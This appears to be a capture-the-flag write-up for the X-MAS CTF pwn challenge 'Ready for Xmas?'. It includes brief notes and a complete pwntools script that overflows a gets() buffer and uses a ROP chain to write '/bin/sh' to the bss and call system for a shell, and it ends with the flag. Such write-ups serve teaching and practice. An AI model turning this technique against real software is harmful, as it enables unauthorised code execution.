---
title: Ready for Xmas?
date: 2021-01-22
categories: [pwn]
tags: [xmasctf]
toc: false
---


#### Description: Are you ready for aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/bin/shawhkj\\xffwaa ?

Arch: amd64-64-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)

![](https://elnathctf.files.wordpress.com/2021/01/image.png?w=726)

 
#### Notes:


- memset(0x601068, 0, 9) gives us 9 bytes to write to in the bss

- gets() -> buffer overflow

- NX is enabled so can't execute on stack

- No PIE, can use ropchain to write '/bin/sh' to bss and pass bss address into system

- mprotect is used here to check input for presence of 'sh' and 'cat'.

The approach I took was to build a ropchain to use gets() to write '/bin/sh' to the bss and then pass that address to system. The only gadget needed for this was a pop rdi ; ret

#### PoC:

  
```Python

from pwn import *

POP_RDI_RET = p64(0x00000000004008e3)
RET = p64(0x00000000004005e6)

def create_payload(junk):

	payload = b''
	payload += junk
	payload += POP_RDI_RET
	payload += p64(0x601068) # bss addr
	payload += p64(0x400630) # gets
	payload += RET
	payload += POP_RDI_RET
	payload += p64(0x601068) # bss addr
	payload += RET
	payload += RET
	payload += RET
	payload += p64(0x400610) # system

	return payload

  
def send_payload(io, payload):
	io.sendlineafter('Christmas?', payload)

def main():

	isRemote = False
	if isRemote:
		io = remote('challs.xmas.htsp.ro', 2001)

	else:
		io = process(['./chall'])

	context.log_level = 'debug'
	context.terminal = ['tmux', 'splitw', '-h']
	context.binary = './chall'

	isDebug = False
	if isDebug:
		gdb.attach(io, '''
			b *0x400852
			b *0x400875
		''')

	junk = b'A'*72

	payload = create_payload(junk)
	send_payload(io, payload)
	
	# write to bss
	io.sendline(b'/bin/sh\x00')

	io.interactive()

if __name__ == "__main__":
	main()

# X-MAS{l00ks_lik3_y0u_4re_r3ady}

```